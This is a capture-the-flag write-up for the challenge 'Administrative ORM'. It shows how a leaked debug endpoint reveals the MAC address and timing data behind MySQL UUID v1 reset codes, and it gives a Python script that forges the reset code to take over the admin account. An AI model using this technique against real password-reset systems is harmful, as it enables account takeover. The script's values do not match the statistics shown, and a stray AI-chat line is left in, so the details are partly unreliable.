# Administrative ORM

#### Step 1: Read the Source Code

As always, the first step is to **read the source code** and understand its functionalities and tools.

If you're unsure about how a specific part of the code works, you can copy and paste it into **ChatGPT** or another AI assistant to get a detailed explanation.

Here's your upgraded writeup with the UUID explanation included:

***

#### Step 2: Understanding the Challenge

The website has a **user named "admin"** with a **random 32-character password**.

To get the flag, we need to visit:

```
/get_flag?password=admin's password
```

Since we don’t know the admin's password, we must **reset** it.

( The code is not vulnerable to SQLI)

However, the password reset mechanism requires a **UUID (reset\_code)** to authorize the process.

#### **Step 3: Understanding UUID**

**What is a UUID?**

A **UUID (Universally Unique Identifier)** is a **128-bit number** used to uniquely identify objects.

UUIDs are widely used in databases, distributed systems, and authentication mechanisms to ensure **unique identification** without collisions.

UUIDs have multiple versions, but the most commonly used are:

* **UUID v1** → Generated using the **timestamp, MAC address, and a clock sequence**
* **UUID v4** → Generated randomly, offering better security

***

In this challenge, we are working with **MySQL**, which provides a built-in function to generate UUIDs.

By default, MySQL uses **UUID v1**, which means the generated UUIDs are **not completely random**—they are **predictable** if we can extract the required components.

### Step 4 : identifying the vulnerability

Thankfully the author left us a comment on /statistics

```js
@app.route("/statistics") # TODO: remove statistics
def statistics():
    return debug.statistics()
```

lets visit /statistics :)

```css
Interface statistics:
eth0      Link encap:Ethernet  HWaddr 02:42:AC:11:00:0C  
          inet addr:172.17.0.12  Bcast:172.17.255.255  Mask:255.255.0.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:18 errors:0 dropped:0 overruns:0 frame:0
          TX packets:12 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:4059 (3.9 KiB)  TX bytes:2159 (2.1 KiB)

Database statistics:
	clock_sequence: 0
	delete_latency: 0
	fetch_latency: 53410532
	insert_latency: 0
	last_reset: 0
	rows_deleted: 0
	rows_fetched: 4
	rows_inserted: 0
	rows_updated: 1
	total_latency: 677185684
	update_latency: 623775152
```

Taking a quick look , we notice that the components of generating a uuid V1 are mentionned here

```
timestamp, MAC address, and the clock sequence
```

Using some AI tools , i was able to regenrate the UUID using given data

```python
import uuid
import pandas as pd
import numpy as np

# Provided information
mac = "02:42:AC:11:00:0C"  # MAC address from eth0
ldate = "2025-02-02"  # Last reset date from database statistics
ltime = "17:34:16.749301"  # Last reset time from database statistics
clock_sequence = 2079  # Clock sequence from database statistics

# Function to convert a time string (hh:mm:ss.nnnnnnnnn) into nanoseconds
def str_to_ns(time_str):
    h, m, s = time_str.split(":")
    int_s, ns = s.split(".")
    ns = map(lambda t, unit: np.timedelta64(t, unit),
             [h, m, int_s, ns.ljust(9, '0')], ['h', 'm', 's', 'ns'])
    return sum(ns)

# Function to convert MAC address in string format to an integer
def parse_mac(mac):
    return int(mac.replace(':', ''), 16)

# Custom implementation of uuid1() to generate UUID using a node (MAC), clock sequence, and timestamp
def uuid1(node, clock_seq, ts):
    timestamp = ts // 100 + 0x01b21dd213814000
    time_low = timestamp & 0xffffffff
    time_mid = (timestamp >> 32) & 0xffff
    time_hi_version = (timestamp >> 48) & 0x0fff
    clock_seq_low = clock_seq & 0xff
    clock_seq_hi_variant = (clock_seq >> 8) & 0x3f
    return uuid.UUID(fields=(time_low, time_mid, time_hi_version,
                              clock_seq_hi_variant, clock_seq_low, node), version=1)

def generate_uuid():
    # Convert the date string to nanoseconds
    nseconds = pd.to_datetime(ldate, format='%Y-%m-%d').timestamp() * 1000 * 1000 * 1000
    
    # Use the str_to_ns() function to get the nanoseconds from the time string and add the missing part
    time_in_ns = str_to_ns(ltime) + int(nseconds)

    # Generate the UUID using the modified uuid1 function (with MAC, clock sequence, and timestamp)
    UUID = uuid1(parse_mac(mac), int(clock_sequence), int(time_in_ns))

    # Return the generated UUID as a string
    return str(UUID)

# Call the function to generate the UUID
generated_uuid = generate_uuid()

# Output the generated UUID
print("Generated UUID:", generated_uuid)
```

Than just reset the password using the generated uuid and visit /get\_flag?password=newpass
